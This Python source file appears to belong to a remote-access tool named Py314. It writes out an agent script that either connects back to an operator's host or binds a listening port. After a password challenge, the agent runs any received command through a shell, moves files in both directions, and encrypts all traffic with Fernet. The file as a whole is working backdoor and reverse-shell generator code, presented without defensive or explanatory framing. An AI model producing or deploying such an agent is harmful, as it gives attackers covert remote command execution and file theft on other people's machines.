
import sys
import logging


def writeAgent(output, socket, host, port, password):

    agent  = '''

import os
import sys
import time
import socket
import base64
import hashlib
import logging
import threading
import subprocess
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

def generate_key(password):
    """Generate fernet key from password"""

    digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
    digest.update(password.encode())
    key = base64.urlsafe_b64encode(digest.finalize())

    logging.debug(f"Password for key generation : {{password}}")
    logging.debug(f"Generated key : {{key}}")

    return key

def encrypt_file(password, infile, outfile):
    """Encrypt file"""

    try:

        fernet = Fernet(generate_key(password))

        with open(infile, 'rb') as fileStream:
            plainData = fileStream.read()

        with open(outfile, 'wb') as fileStream:

            encrypted = fernet.encrypt(plainData)
            fileStream.write(encrypted)

        logging.debug(f"Source file for encryption : {{infile}}")
        logging.debug(f"Destination for encryption : {{outfile}}")
            
    except Exception as error:
        logging.warning(f"An error occured during file decryption : {{error}}")



def encrypt_message(password, message):
    """Encrypt a message with str type and return message as str encrypted"""
    
    try:

        fernet = Fernet(generate_key(password))

        message = message.encode()
        encrypted = fernet.encrypt(message)

        logging.debug(f"Message before encryption : {{message}}")
        logging.debug(f"Message after encryption : {{encrypted.decode()}}")

        return encrypted.decode()

    except Exception as error:
        logging.warning(f"An error occured during message encryption : {{error}}")

    
def decrypt_file(password, infile, outfile):
    """Encrypt file"""

    try:

        fernet = Fernet(generate_key(password))

        with open(infile, 'rb') as fileStream:
            cipherData = fileStream.read()

        with open(outfile, 'wb') as fileStream:

            decrypted = fernet.decrypt(cipherData)
            fileStream.write(decrypted)

        logging.debug(f"Source file for decryption : {{infile}}")
        logging.debug(f"Destination for decryption : {{outfile}}")
            
    except Exception as error:
        logging.warning(f"An error occured during file decryption : {{error}}")


def decrypt_message(password, message):
    """Decrypt a message with str type and return message as str decrypted"""

    try:

        fernet = Fernet(generate_key(password))

        message = message.encode()
        decrypted = fernet.decrypt(message)

        logging.debug(f"Message before decryption : {{message}}")
        logging.debug(f"Message after decryption : {{decrypted.decode()}}")

        return decrypted.decode()

    except Exception as error:
        logging.warning(f"An error occured during message decryption : {{error}}")





def passwordChallenge(channel, passwd):

    bufferSize = BUFFER_SIZE

    ciperPassword = hashlib.sha512(passwd.encode()).hexdigest()
    while True:
        rawHashPassword = channel.recv(bufferSize)
        if len(rawHashPassword) < bufferSize:
            break

    # Decode bytes to str
    hashPassword = rawHashPassword.decode()

    logging.debug(f"Password used for password challenge : {{password}}")
    logging.debug(f"Generated SHA512 : {{ciperPassword}}")
    logging.debug(f"Received SHA512 : {{hashPassword}}")
    
    if hashPassword == ciperPassword:
        logging.debug('Successfull password challenge')
        response = hashlib.sha512(ciperPassword.encode()).hexdigest()
        channel.sendall(response.encode())
        challenge = True
    
    elif hashPassword != ciperPassword:
        logging.debug('Password challenge failed')
        response = b' '
        channel.sendall(response)
        channel.close()
        challenge = False

    return challenge, hashPassword


def receiveFile(channel, password, request):
    
    src = request.split(' ')[1]
    srcBasename = os.path.basename(src)
    dst = request.split(' ')[2]

    dstFile = f"{{dst}}/{{srcBasename}}"
    tempFile = f"{{dst}}/temp.crypt"

    logging.debug(f"Channel : {{channel}}")
    logging.debug(f"Password : {{password}}")
    logging.debug(f"Request : {{request.split(' ')[0]}}")
    logging.debug(f"Wanted filename : {{srcBasename}}")
    logging.debug(f"Destination folder : {{dst}}")
    logging.debug(f"Temporary file : {{tempFile}}")
    logging.debug(f"Final file : {{dstFile}}")

    if not os.path.isdir(dst):
        logging.debug(f"Destination folder {{dst}} doesn't exist")
        answer = '!'
        transfer = False

    elif os.path.isdir(dst):
        logging.debug(f"Destination folder {{dst}} is valid")
        answer = 'ready'
        transfer = True

    encryptedAnswer = encrypt_message(password, answer)
    channel.sendall(encryptedAnswer.encode())
    logging.debug(f"Sending answer : {{answer}}")

    if transfer is True:

        with open(tempFile, 'ab') as fileStream:

                bufferSize = BUFFER_SIZE
                rawFile = b''
                
                # While loop to complete socket buffer in recv 
                while True:
                    rawFile = channel.recv(bufferSize)
                    fileStream.write(rawFile)
                    logging.debug(f"Write partial file : {{rawFile}}")
                    if len(rawFile) < bufferSize:
                        logging.debug('break recv while loop')
                        break
        logging.debug(f"Temporary file successfully written")

        decrypt_file(password, tempFile, dstFile)
        os.remove(tempFile)
        logging.debug(f"Temporary file {{tempFile}} deleted")


def sendFile(channel, password, request):

    localFile = request.split(' ')[1]
    parentDir = os.path.dirname(localFile)
    tempFile = f"{{parentDir}}/temp.crypt"

    logging.debug(f"Channel : {{channel}}")
    logging.debug(f"Password : {{password}}")
    logging.debug(f"Request : {{request.split(' ')[0]}}")
    logging.debug(f"Wanted local file : {{localFile}}")
    logging.debug(f"Temporary file : {{tempFile}}")

    if not os.path.isfile(localFile):
        logging.debug(f"Local file for download {{localFile}} doesn't exist")
        answer = '!'
        transfer = False
    elif os.path.isfile(localFile):
        logging.debug(f"Local file {{localFile}} exist")
        answer = 'ready'
        transfer = True

        encrypt_file(password, localFile, tempFile)

    encryptedAnswer = encrypt_message(password, answer)
    channel.sendall(encryptedAnswer.encode())
    logging.debug(f"Sending answer : {{answer}}")


    if transfer is True:

        with open(tempFile, 'rb') as fileStream:
            binaryData = fileStream.read()
            channel.sendall(binaryData)
    
        os.remove(tempFile)
        logging.debug(f"File {{tempFile}} removed")





def serverHandler(channel, password):

    # Loop on socket.recv
    while True:
    
        try:
            # Define buffer size, can be increased
            bufferSize = BUFFER_SIZE
            rawRequest, tempBuffer = b'', b''
            
            # While loop to complete socket buffer in recv 
            while True:
                tempBuffer = channel.recv(bufferSize)
                rawRequest += tempBuffer
                if len(tempBuffer) < bufferSize:
                    break
            # Decode bytes to str
            clientRequestEncrypted = rawRequest.decode()
            clientRequest = decrypt_message(password, clientRequestEncrypted)
    
# ------------------------------- Py314 REQUEST PARSING -------------------------------

            # If 'cd' command send
            if clientRequest.split(' ')[0] == 'cd':
                workingDir = clientRequest.split(' ')[1]
                logging.debug('Cd command send by Py314')
                logging.debug(f'Want to move to {{workingDir}}')
                if os.path.isdir(workingDir):
                    os.chdir(workingDir)
                    # Return empty output, to not block the remote shell
                    output = ' '
                else:
                    output = f"{{workingDir}} doesn'nt exist"

                encryptedOutput = encrypt_message(password, output)
                channel.sendall(encryptedOutput.encode())

            # If check alive
            elif clientRequest == 'alive ?':
                logging.debug('Alive checking from Py314')
                output  = "alive !"
                logging.debug('Sending alive')

                encryptedOutput = encrypt_message(password, output)
                channel.sendall(encryptedOutput.encode())

            # Elif client want to upload a file
            elif clientRequest.split(' ')[0] == 'upload':
                receiveFile(channel, password, clientRequest)

            elif clientRequest.split(' ')[0] == 'download':
                sendFile(channel, password, clientRequest)

            
            # Else execute shell command
            else:
                workingDir = os.getcwd()
                output = shellCommand(clientRequest, workingDir)

                encryptedOutput = encrypt_message(password, output)
                channel.sendall(encryptedOutput.encode())


        except KeyboardInterrupt:
            channel.close()
            exit()

        except Exception as error:
            logging.warning(f"{{error}}")
            exit()

    




def shellCommand(command, cwd):

    # Easy command, with no output handler
    #output = subprocess.check_output(command, shell=True, stderr=STDOUT)

    # Complete shell command, with pipe to get STDOUT, STDERR
    shellCommand = subprocess.Popen(

        str(command),
        cwd=cwd,
        shell=True, 
        stdout=subprocess.PIPE, 
        stderr=subprocess.PIPE, 
        stdin=subprocess.PIPE
    )
    
    # Get exit code
    exitCode = shellCommand.returncode
    # Parse STDOUT and STDERR
    STDOUT, STDERR = shellCommand.communicate()

    # If not STDOUT and STDERR, return STDERR in remote shell
    if not STDOUT and STDERR:
        shellOutput = STDERR
    # If STDOUT and not STDERR, return STDOUT in remote shell
    elif not STDERR and STDOUT:
        shellOutput = STDOUT
    # Else, return an empty str (in case of system command touch/rm/cat...)
    else:
        shellOutput = b' '

    return shellOutput.decode()



def ConnectPy314(ip, port):
    """Function to established a connection with Py314"""

    try: 
        {}

    except KeyboardInterrupt:
        exit()

# ------------------------------------------------------------------------------
# ------------------------------------------------------------------------------
# ------------------------------------------------------------------------------

BUFFER_SIZE = 1024

if len(sys.argv) > 1:
    verbose = sys.argv[1]
    if verbose == '-v':
        level = logging.INFO
        logFormat = '[%(asctime)s]-[%(levelname)s] : %(message)s'
    elif verbose == '-vv':
        level = logging.DEBUG
        logFormat = '[%(asctime)s]-[%(levelname)s] (from %(funcName)s in %(module)s) : %(message)s'

    logging.basicConfig(level=level, format=logFormat, datefmt='%H:%M:%S')


ip = '{}'
port = {}
password = '{}'
ciperPassword = hashlib.sha512(password.encode()).hexdigest()


try:

    channel = ConnectPy314(ip, port)
    
    challenge, receivedHash = passwordChallenge(channel, password)
    if challenge is True:
        serverHandler(channel, password)
    elif challenge is False:
        logging.debug(f"Closing channel {{channel}}")
        channel.close()


except KeyboardInterrupt:
    if 'channel' in globals():
        channel.close()
    exit()
    
    
except Exception as error:
    logging.warning(f"{{error}}")
    exit()

 

    '''.format(
        socket,
        host,
        port,
        password
    )

    try:

        with open(output, 'w') as fileStream:
            fileStream.write(agent)

        logger.info(f"Agent successfully write to {output}")

    except Exception as error:
        logger.warning(f"An error occured when trying to write agent : ")
        print(error)



def createSocket(agentType):

    if agentType == 'bind_agent':
        socket = f"""
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        s.bind((ip, port))
        s.listen(5)

        logging.info(f"Listening on {{ip}}:{{port}}")

        while True:

            channel, cliAddress = s.accept()
            logging.info(f"Received Connection from {{cliAddress[0]}}")

            return channel

    """


    elif agentType == 'reverse_listener':
        socket = """
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        logging.info(f"Trying to bind {ip}:{port}")

        while True:

            try:

                s.connect((ip, port))
                return s

            except ConnectionError:
                time.sleep(1)
                pass
    """


    return socket

# --------------------------------------------------------------------
# --------------------------- Main -----------------------------------
# --------------------------------------------------------------------


logger = logging.getLogger('main')